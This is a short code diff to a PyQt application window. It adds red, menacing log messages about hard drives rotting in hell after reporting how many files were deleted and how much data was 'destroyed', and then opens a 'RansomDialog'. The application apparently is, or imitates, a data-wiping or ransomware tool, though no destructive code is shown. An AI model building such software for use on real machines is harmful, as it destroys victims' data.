@@ -699,6 +699,10 @@ class MainWindow(QMainWindow):
         self.launch_btn.setEnabled(True)
         stats_text = (f"{self.stat_deleted.text()} files deleted, "
                       f"{self.stat_data.text()} destroyed")
+        self._log_line("", "#ff0000")
+        self._log_line("Hellhound Fetched Their souls.", "#ff0000")
+        self._log_line("Hard drives will Rott in Hell.", "#ff0000")
+        self._log_line("Goodbye My Pup.", "#ff0000")
         RansomDialog(self, stats_text).exec_()
 
 
